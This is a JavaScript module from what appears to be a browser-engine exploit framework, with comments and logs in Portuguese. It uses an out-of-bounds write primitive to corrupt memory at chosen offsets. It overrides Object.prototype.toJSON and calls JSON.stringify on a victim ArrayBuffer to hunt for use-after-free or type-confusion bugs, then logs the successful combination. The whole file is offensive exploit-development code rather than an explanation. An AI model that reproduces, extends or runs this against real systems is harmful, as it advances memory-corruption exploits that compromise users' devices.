// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_write_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

export const FNAME_MODULE = "JsonUAFSpeculative";

// --- Parâmetros de Teste Configuráveis ---
const SPECULATIVE_TEST_CONFIG = {
    victim_ab_size: 64,
    corruption_offsets: [
        0x70,
        0x78,
        0x7C,
    ],
    values_to_write: [
        0xFFFFFFFF,
        0x0,
        0x1,
    ],
    bytes_to_write_for_corruption: 4,
    ppKey: 'toJSON',
    stop_on_first_success: true,
};
// --- Fim dos Parâmetros ---

export async function testJsonTypeConfusionUAFSpeculative() {
    const FNAME = "testJsonTypeConfusionUAFSpeculative";
    logS3(`--- Iniciando Teste Especulativo UAF/Type Confusion via JSON (Refinado) ---`, "test", FNAME);
    logS3(`    Config: victim_size=${SPECULATIVE_TEST_CONFIG.victim_ab_size}, ppKey=${SPECULATIVE_TEST_CONFIG.ppKey}`, "info", FNAME);
    logS3(`    Offsets: ${SPECULATIVE_TEST_CONFIG.corruption_offsets.map(o => toHex(o)).join(', ')}`, "info", FNAME);
    logS3(`    Valores: ${SPECULATIVE_TEST_CONFIG.values_to_write.map(v => toHex(v)).join(', ')}`, "info", FNAME);

    let overallTestSuccess = false;
    let successDetails = {};

    for (const corruption_offset of SPECULATIVE_TEST_CONFIG.corruption_offsets) {
        if (overallTestSuccess && SPECULATIVE_TEST_CONFIG.stop_on_first_success) break;

        for (const value_to_write of SPECULATIVE_TEST_CONFIG.values_to_write) {
            if (overallTestSuccess && SPECULATIVE_TEST_CONFIG.stop_on_first_success) break;

            let currentIterationSuccess = false;
            await triggerOOB_primitive({ force_reinit: true });
            if (!oob_array_buffer_real) {
                logS3("Falha ao configurar ambiente OOB. Abortando iteração.", "error", FNAME);
                continue;
            }

            let victim_ab = new ArrayBuffer(SPECULATIVE_TEST_CONFIG.victim_ab_size);

            const ppKey = SPECULATIVE_TEST_CONFIG.ppKey;
            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

            try {
                logS3(`Iteração: Offset=${toHex(corruption_offset)}, Valor=${toHex(value_to_write)}`, "subtest", FNAME);
                Object.defineProperty(Object.prototype, ppKey, {
                    value: function() {
                        try {
                            const byteLength = this.byteLength;
                            logS3(`[${ppKey} Poluído] Chamado! 'this.byteLength' acessado com sucesso (${byteLength}). Nenhuma TC óbvia.`, 'info', FNAME);
                            return { toJSON_executed: true, type: Object.prototype.toString.call(this) };
                        } catch (e) {
                            logS3(`---> [${ppKey} Poluído] ERRO ao acessar 'this.byteLength': ${e.message}`, "critical", FNAME);
                            logS3(`---> POTENCIAL TYPE CONFUSION / UAF ENCONTRADO! <---`, "vuln", FNAME);
                            logS3(`---> COMBO VENCEDOR: Offset=${toHex(corruption_offset)}, Valor=${toHex(value_to_write)}`, "vuln", FNAME);
                            currentIterationSuccess = true;
                            overallTestSuccess = true;
                            successDetails = { offset: toHex(corruption_offset), value: toHex(value_to_write), error: e.message };
                            // Lançar o erro para cima para que o stringify também o capture, se necessário
                            throw e;
                        }
                    },
                    writable: true, configurable: true, enumerable: false
                });

                logS3(`CORRUPÇÃO: Escrevendo valor ${toHex(value_to_write)} em offset abs ${toHex(corruption_offset)}`, "warn", FNAME);
                oob_write_absolute(corruption_offset, value_to_write, SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption);
                
                await PAUSE_S3(50);

                logS3(`GATILHO: Chamando JSON.stringify(victim_ab)...`, "info", FNAME);
                JSON.stringify(victim_ab);

            } catch (mainError) {
                // Erros críticos ou o erro propagado de 'toJSON' serão capturados aqui
                if (!currentIterationSuccess) { // Se o sucesso ainda não foi registrado
                    logS3(`Erro na iteração principal: ${mainError.message}`, "error", FNAME);
                }
            } finally {
                if (originalToJSONDescriptor) {
                    Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                } else {
                    delete Object.prototype[ppKey];
                }
            }
             await PAUSE_S3(50);
        }
    }

    clearOOBEnvironment();
    logS3(`--- Teste Especulativo Concluído ---`, "test", FNAME);
    return {
        success: overallTestSuccess,
        details: successDetails
    };
}
